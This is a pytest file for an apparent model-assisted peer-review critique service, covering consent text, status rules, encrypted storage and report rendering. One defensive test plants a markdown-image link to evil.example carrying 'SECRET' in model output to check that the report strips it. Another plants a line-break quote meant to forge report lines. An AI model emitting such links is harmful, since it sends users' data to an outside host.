"""Budget reservation, consent text, status rules, persistence and the plain-text report."""

import re
import uuid
from collections.abc import AsyncIterator
from datetime import UTC, datetime
from typing import Any

import pytest
import pytest_asyncio
from cryptography.fernet import Fernet
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine

from src.agents.critique.panel import PanelResult, RoleResult, run_panel
from src.agents.critique.roles import ROLES
from src.core.config import settings
from src.core.memory_encryption import DocumentEncryptionUnavailable
from src.models.db.base import Base
from src.models.db.document_critique import DOCUMENT_CRITIQUES, CritiqueFinding
from src.repositories.critique_repository import CritiqueRepository, CritiqueView
from src.services import critique_service as service
from src.services.document_jobs import transition
from tests.test_critique_panel import (
    DOC,
    PAGE1,
    Q1,
    Q2,
    by_role,
    issue,
    make_doc,
    reply,
)

ORG, USER = uuid.uuid4(), uuid.uuid4()
KEY = Fernet.generate_key().decode()
FORBIDDEN = (
    r"\boriginal(ity)?\b",
    r"plagiarism[- ]free",
    r"\d+(\.\d+)?\s*%",
    r"\bscore\b",
    r"\baccept(ed)?\b",
    r"\breject(ed)?\b",
)


@pytest.fixture(autouse=True)
def _key(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(settings, "DOCUMENT_ENCRYPTION_KEY", KEY)


def roles(*statuses: str) -> PanelResult:
    return PanelResult(
        "m",
        0.2,
        tuple(
            RoleResult(role.name, status, "t" * 64)
            for role, status in zip(ROLES, statuses, strict=True)
        ),
    )


# ---- reservation, consent, model --------------------------------------------


def test_reservation_covers_every_call_and_the_red_team_prior_block() -> None:
    assert service.reserved_units(1_000) == (1_000 + 8_000) * 10 + 2 * 40_000


def test_the_consent_names_the_provider_host_and_model_and_hashes_its_text() -> None:
    (consent,) = service.CONSENTS
    assert consent.version == "critique-consent-v1"
    for needle in (
        "generativelanguage.googleapis.com",
        "gemini-2.5-flash",
        "up to 10 requests",
        "confidential peer review",
        "uncalibrated",
    ):
        assert needle in consent.text
    import hashlib

    assert consent.sha256 == hashlib.sha256(consent.text.encode()).hexdigest()


def test_the_provider_model_makes_one_request_per_call(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(settings, "GEMINI_API_KEY", "not-a-real-key")
    built = service.build_review_model()
    assert built._chat.max_retries == 1  # type: ignore[attr-defined]
    assert (built.model_id, built.temperature) == (
        service.CRITIQUE_MODEL_ID,
        service.CRITIQUE_TEMPERATURE,
    )


def test_critique_limits_are_the_documented_constants() -> None:
    limits = service.CRITIQUE_LIMITS
    assert (
        limits.per_user_daily,
        limits.per_org_daily_units,
        limits.global_daily_units,
        limits.per_org_concurrent,
        limits.global_daily_count,
    ) == (5, 60_000_000, 300_000_000, 2, None)


# ---- status rules --------------------------------------------------------------


@pytest.mark.parametrize(
    ("statuses", "expected"),
    [
        (("succeeded",) * 5, "succeeded"),
        (("succeeded",) * 4 + ("failed",), "partial"),
        (
            ("succeeded", "failed", "truncated", "refused", "skipped_no_inputs"),
            "partial",
        ),
        (("failed",) * 4 + ("skipped_no_inputs",), "failed"),
        (("truncated",) * 5, "failed"),
    ],
)
def test_status_is_by_how_many_roles_succeeded(
    statuses: tuple[str, ...], expected: str
) -> None:
    assert service.final_status(roles(*statuses)) == expected


# ---- persistence ----------------------------------------------------------------


@pytest_asyncio.fixture(name="factory")
async def factory_fixture(
    tmp_path: Any,
) -> AsyncIterator[async_sessionmaker[AsyncSession]]:
    engine = create_async_engine(f"sqlite+aiosqlite:///{tmp_path}/c.db")
    async with engine.begin() as connection:
        await connection.run_sync(Base.metadata.create_all)
    yield async_sessionmaker(engine, expire_on_commit=False)
    await engine.dispose()


async def run_stub_panel() -> PanelResult:
    model = by_role(
        methods=reply([issue(Q1), issue(Q2, severity="critical", category="design")]),
        citations=reply(
            [issue(Q1, problem="The references are accurate.", category="other")]
        ),
    )
    return await run_panel(DOC, model=model)


async def stored(factory: async_sessionmaker[AsyncSession]) -> uuid.UUID:
    async with factory() as session:
        row = await CritiqueRepository(session, service.document_cipher()).create(
            document_id=uuid.uuid4(),
            organization_id=ORG,
            user_id=USER,
            model_id="stub-model",
            temperature=0.2,
            prompt_versions=service.prompt_versions(),
            consent_text_version="critique-consent-v1",
            consent_text_sha256="0" * 64,
            reserved_units=1,
        )
        await session.commit()
        return row.id


async def mark_finished(
    factory: async_sessionmaker[AsyncSession], critique_id: uuid.UUID
) -> None:
    async with factory() as session:
        await transition(
            session,
            DOCUMENT_CRITIQUES,
            critique_id,
            expected="queued",
            new="succeeded",
            completed_at=datetime.now(UTC),
        )
        await session.commit()


async def test_persist_stores_findings_encrypted_and_reads_them_back_by_severity(
    factory: async_sessionmaker[AsyncSession],
) -> None:
    critique_id = await stored(factory)
    panel = await run_stub_panel()
    persist = service.make_persist(
        critique_id=critique_id, organization_id=ORG, user_id=USER
    )
    async with factory() as session:
        status, fields = await persist(session, panel)
        await session.commit()
    await mark_finished(factory, critique_id)
    assert status == "succeeded" and "status_reason" not in fields
    assert fields["role_outcomes"]["methods"]["kept"] == 2
    async with factory() as session:
        raw = (await session.execute(select(CritiqueFinding))).scalars().all()
        view = await CritiqueRepository(session, service.document_cipher()).get(
            critique_id, organization_id=ORG, user_id=USER
        )
    assert len(raw) == 3
    assert all(r.quote_enc.startswith("fernet:") and Q1 not in r.quote_enc for r in raw)
    assert view is not None
    assert view.findings[0].severity == "critical"
    assert {f.quote for f in view.findings} == {Q1, Q2}
    assert all(DOC.text[f.raw_start : f.raw_end] == f.quote for f in view.findings)


async def test_findings_are_not_loaded_while_the_run_is_still_active(
    factory: async_sessionmaker[AsyncSession],
) -> None:
    critique_id = await stored(factory)
    persist = service.make_persist(
        critique_id=critique_id, organization_id=ORG, user_id=USER
    )
    async with factory() as session:
        await persist(session, await run_stub_panel())
        await session.commit()
    async with factory() as session:
        view = await CritiqueRepository(session, service.document_cipher()).get(
            critique_id, organization_id=ORG, user_id=USER
        )
    assert view is not None and view.status == "queued" and view.findings == ()


async def test_all_roles_failing_records_a_reason_and_no_findings(
    factory: async_sessionmaker[AsyncSession],
) -> None:
    critique_id = await stored(factory)
    persist = service.make_persist(
        critique_id=critique_id, organization_id=ORG, user_id=USER
    )
    async with factory() as session:
        outcome = roles(*("failed",) * 4, "skipped_no_inputs")
        status, fields = await persist(session, outcome)
    assert (status, fields["status_reason"]) == ("failed", "all_roles_failed")


async def test_a_tracing_refusal_fails_the_run_with_its_reason(
    factory: async_sessionmaker[AsyncSession],
) -> None:
    persist = service.make_persist(
        critique_id=uuid.uuid4(), organization_id=ORG, user_id=USER
    )
    async with factory() as session:
        assert await persist(session, None) == (
            "failed",
            {"status_reason": "tracing_enabled"},
        )


async def test_with_no_key_persist_raises_and_writes_nothing(
    factory: async_sessionmaker[AsyncSession], monkeypatch: pytest.MonkeyPatch
) -> None:
    critique_id = await stored(factory)
    panel = await run_stub_panel()
    monkeypatch.setattr(settings, "DOCUMENT_ENCRYPTION_KEY", "")
    persist = service.make_persist(
        critique_id=critique_id, organization_id=ORG, user_id=USER
    )
    async with factory() as session:
        with pytest.raises(DocumentEncryptionUnavailable):
            await persist(session, panel)
        await session.rollback()
    async with factory() as session:
        assert (await session.execute(select(CritiqueFinding))).first() is None


async def test_a_value_stored_without_the_prefix_reads_as_missing(
    factory: async_sessionmaker[AsyncSession],
) -> None:
    critique_id = await stored(factory)
    panel = await run_stub_panel()
    persist = service.make_persist(
        critique_id=critique_id, organization_id=ORG, user_id=USER
    )
    async with factory() as session:
        await persist(session, panel)
        row = (await session.execute(select(CritiqueFinding))).scalars().first()
        assert row is not None
        row.quote_enc = Q1
        await session.commit()
    await mark_finished(factory, critique_id)
    async with factory() as session:
        view = await CritiqueRepository(session, service.document_cipher()).get(
            critique_id, organization_id=ORG, user_id=USER
        )
    assert view is None


# ---- report ---------------------------------------------------------------------


async def rendered_view(
    factory: async_sessionmaker[AsyncSession], panel: PanelResult
) -> CritiqueView:
    critique_id = await stored(factory)
    persist = service.make_persist(
        critique_id=critique_id, organization_id=ORG, user_id=USER
    )
    async with factory() as session:
        status, fields = await persist(session, panel)
        await transition(
            session,
            DOCUMENT_CRITIQUES,
            critique_id,
            expected="queued",
            new=status,
            completed_at=datetime.now(UTC),
            **fields,
        )
        await session.commit()
    async with factory() as session:
        view = await CritiqueRepository(session, service.document_cipher()).get(
            critique_id, organization_id=ORG, user_id=USER
        )
    assert view is not None
    return view


async def test_the_report_has_its_header_footer_and_the_reference_warning(
    factory: async_sessionmaker[AsyncSession],
) -> None:
    view = await rendered_view(factory, await run_stub_panel())
    text = service.render_report(view, "d" * 64)
    for needle in (
        "stub-model",
        "temperature 0.2",
        "d" * 64,
        "methods",
        "kept 2",
        "Model-assisted and uncalibrated. All roles use one model family",
        *service.REPORT_FOOTER,
    ):
        assert needle in text
    assert text.count(service.REFERENCE_WARNING) == 1
    assert text.index(service.REFERENCE_WARNING) > text.index("The references")


async def test_the_report_never_uses_verdict_vocabulary(
    factory: async_sessionmaker[AsyncSession],
) -> None:
    view = await rendered_view(factory, await run_stub_panel())
    text = service.render_report(view, "d" * 64)
    for pattern in FORBIDDEN:
        assert not re.search(pattern, text, re.I), pattern


def test_the_fixed_report_text_alone_matches_no_verdict_pattern() -> None:
    fixed = " ".join(
        (
            service.REPORT_DISCLAIMER,
            service.REFERENCE_WARNING,
            *service.REPORT_FOOTER,
            service.CONSENT_TEXT_V1,
        )
    )
    for pattern in FORBIDDEN:
        assert not re.search(pattern, fixed, re.I), pattern


async def test_a_url_or_markdown_link_the_model_wrote_never_reaches_the_report(
    factory: async_sessionmaker[AsyncSession],
) -> None:
    exfil = "See ![x](https://evil.example/?d=SECRET) and https://evil.example/a"
    model = by_role(methods=reply([issue(Q1, problem=exfil, fix=exfil)]))
    panel = await run_panel(make_doc(PAGE1), model=model)
    view = await rendered_view(factory, panel)
    text = service.render_report(view, "d" * 64)
    assert "https://" not in text and "](" not in text and "SECRET" not in text


def test_the_work_reads_the_panel_result_shape_the_report_expects() -> None:
    assert set(service.role_outcomes(roles(*("succeeded",) * 5))["methods"]) == {
        "status",
        "kept",
        "dropped",
        "fields_sanitized",
        "finish_reason",
        "input_tokens",
        "output_tokens",
        "error_type",
    }


# ---- review fixes ----------------------------------------------------------------


def a_view(**overrides: Any) -> CritiqueView:
    base: dict[str, Any] = {
        "id": uuid.uuid4(),
        "document_id": uuid.uuid4(),
        "status": "failed",
        "status_reason": "deadline_exceeded",
        "model_id": "m",
        "temperature": 0.2,
        "prompt_versions": {"methods": "abcdef0123456789" * 4},
        "consent_text_version": "v",
        "consent_text_sha256": "0" * 64,
        "role_outcomes": {},
        "created_at": datetime.now(UTC),
        "started_at": None,
        "completed_at": datetime.now(UTC),
    }
    return CritiqueView(**(base | overrides))


def test_a_failed_run_says_so_and_why_in_its_report() -> None:
    text = service.render_report(a_view(), "d" * 64)
    assert "Status: failed (deadline_exceeded)" in text
    assert "Findings: 0" in text
    for pattern in FORBIDDEN:
        assert not re.search(pattern, text, re.I), pattern


def test_the_report_header_lists_prompt_versions_and_dropped_counts() -> None:
    view = a_view(
        status="partial",
        status_reason=None,
        role_outcomes={
            "methods": {
                "status": "succeeded",
                "kept": 1,
                "dropped": {"not_found": 2, "too_short": 1},
            }
        },
    )
    text = service.render_report(view, "d" * 64)
    assert "methods abcdef012345" in text
    assert "dropped not_found 2, too_short 1" in text
    assert (
        "Status: partial" in text
        and "(" not in text.split("Status: partial")[1].split("\n")[0]
    )


async def test_second_quotes_and_the_severity_then_offset_order_round_trip(
    factory: async_sessionmaker[AsyncSession],
) -> None:
    critique_id = await stored(factory)
    model = by_role(
        methods=reply(
            [
                issue(Q2, severity="minor"),
                issue(Q1, severity="minor", second_quote=Q2),
                issue(Q2, severity="critical"),
            ]
        )
    )
    panel = await run_panel(DOC, model=model)
    persist = service.make_persist(
        critique_id=critique_id, organization_id=ORG, user_id=USER
    )
    async with factory() as session:
        await persist(session, panel)
        await session.commit()
    await mark_finished(factory, critique_id)
    async with factory() as session:
        view = await CritiqueRepository(session, service.document_cipher()).get(
            critique_id, organization_id=ORG, user_id=USER
        )
    assert view is not None
    methods = [f for f in view.findings if f.role == "methods"]
    assert [(f.severity, f.quote) for f in methods] == [
        ("critical", Q2),
        ("minor", Q1),
        ("minor", Q2),
    ]
    second = next(f for f in methods if f.second_quote)
    assert second.second_quote == Q2 and second.second_page == 2
    assert DOC.text[second.second_raw_start : second.second_raw_end] == Q2


async def test_active_model_jobs_counts_only_this_orgs_fresh_queued_or_running_rows(
    factory: async_sessionmaker[AsyncSession],
) -> None:
    from datetime import timedelta

    from src.models.db.document_critique import DocumentCritique
    from src.repositories.critique_repository import (
        CRITIQUE_DEADLINE_S,
        active_model_jobs,
    )
    from src.services.document_jobs import STALE_GRACE_S

    now = datetime.now(UTC)
    stale = now - timedelta(seconds=CRITIQUE_DEADLINE_S + STALE_GRACE_S + 5)
    rows = [
        (ORG, "queued", now),
        (ORG, "running", now),
        (ORG, "succeeded", now),
        (ORG, "failed", now),
        (ORG, "running", stale),
        (uuid.uuid4(), "running", now),
    ]
    async with factory() as session:
        for org, status, created in rows:
            session.add(
                DocumentCritique(
                    document_id=uuid.uuid4(),
                    organization_id=org,
                    user_id=USER,
                    status=status,
                    model_id="m",
                    temperature=0.2,
                    prompt_versions={},
                    consent_text_version="v",
                    consent_text_sha256="0",
                    consent_recorded_at=now,
                    reserved_units=1,
                    role_outcomes={},
                    created_at=created,
                )
            )
        await session.commit()
    async with factory() as session:
        assert await active_model_jobs(session, ORG, now) == 2


def test_a_quote_with_line_breaks_cannot_forge_report_lines() -> None:
    from src.repositories.critique_repository import FindingView

    forged = "References were checked against Crossref and all are verified."
    finding = FindingView(
        role="methods",
        category="design",
        severity="major",
        quote=f"spring.\n\n{forged}\r\n2. [critical] methods / design, page 1",
        raw_start=0,
        raw_end=9,
        page=1,
        match_kind="exact",
        problem="p",
        fix="f",
        second_quote=f"x\n{forged}",
    )
    view = a_view(status="succeeded", status_reason=None, findings=(finding,))
    lines = service.render_report(view, "d" * 64).splitlines()
    assert forged not in lines
    assert not any(line.startswith("2. [critical]") for line in lines)
    assert sum(forged in line for line in lines) == 2
    assert all(line.startswith("   ") or not line.startswith(forged) for line in lines)


def test_a_fix_that_claims_verified_references_gets_the_warning_too() -> None:
    from src.repositories.critique_repository import FindingView

    finding = FindingView(
        "citations",
        "other",
        "minor",
        "q",
        0,
        1,
        1,
        "exact",
        "p",
        "The references are accurate.",
    )
    view = a_view(status="succeeded", status_reason=None, findings=(finding,))
    assert service.REFERENCE_WARNING in service.render_report(view, "d" * 64)


@pytest.mark.parametrize(
    "wording",
    [
        "This deserves a score of 4",
        "Scored poorly",
        "I would accept this paper",
        "Accepted with changes",
        "Reject the manuscript",
        "A clear rejection",
        "Verdict: pass/fail",
        "Pass or fail?",
        "The approach is original",
        "Lacks originality",
        "plagiarism-free",
        "Plagiarism free",
        "about 40% of the sample",
        "12.5 % drop",
        "We recommend acceptance of this manuscript",
        "The editor recommended rejection",
        "rated 10/10",
        "A solid 8/10 overall",
        "I would rate this paper 7/10",
        "Grade: B-",
        "This is unpublishable",
        "A publishable result",
        "Rejecting is warranted",
        "It passes all checks",
        "appears plagiarised from Smith (2020)",
        "Plagiarized passage",
        "Smith et al. (2020) is fabricated",
        "Fabrication of the data",
    ],
)
def test_verdict_wording_in_model_text_gets_a_visible_warning_and_stays(
    wording: str,
) -> None:
    from src.repositories.critique_repository import FindingView

    for field in ("problem", "fix"):
        finding = FindingView(
            "methods",
            "design",
            "major",
            "q",
            0,
            1,
            1,
            "exact",
            **{"problem": "p", "fix": "f", field: wording},
        )
        view = a_view(status="succeeded", status_reason=None, findings=(finding,))
        text = service.render_report(view, "d" * 64)
        assert text.count(service.VERDICT_WARNING) == 1, (field, wording)
        assert wording in text


@pytest.mark.parametrize(
    "wording",
    [
        "The sample is small",
        "Passage three repeats itself",
        "Upgrade the figure resolution",
        "The authors graded the items themselves",
        "Report an interval of 0.4 to 0.6",
        "Their originals are cited",
    ],
)
def test_ordinary_review_wording_is_not_flagged_as_a_verdict(wording: str) -> None:
    from src.repositories.critique_repository import FindingView

    finding = FindingView(
        "methods", "design", "major", "q", 0, 1, 1, "exact", wording, "f"
    )
    view = a_view(status="succeeded", status_reason=None, findings=(finding,))
    text = service.render_report(view, "d" * 64)
    assert service.VERDICT_WARNING not in text


def test_the_verdict_warning_itself_uses_no_verdict_wording() -> None:
    for pattern in FORBIDDEN:
        assert not re.search(pattern, service.VERDICT_WARNING, re.I), pattern


@pytest.mark.parametrize(
    "wording",
    ["Reference 12 is a real paper", "every citation was confirmed"],
)
def test_wider_reference_assurances_get_the_reference_warning(wording: str) -> None:
    from src.repositories.critique_repository import FindingView

    finding = FindingView(
        "citations", "other", "minor", "q", 0, 1, 1, "exact", wording, "f"
    )
    view = a_view(status="succeeded", status_reason=None, findings=(finding,))
    assert service.REFERENCE_WARNING in service.render_report(view, "d" * 64)


def test_no_fixed_report_text_trips_its_own_warnings() -> None:
    fixed = " ".join(
        (
            service.REPORT_DISCLAIMER,
            service.VERDICT_WARNING,
            service.REFERENCE_WARNING,
            *service.REPORT_FOOTER,
        )
    )
    assert not service._VERDICT_WORDING.search(fixed)
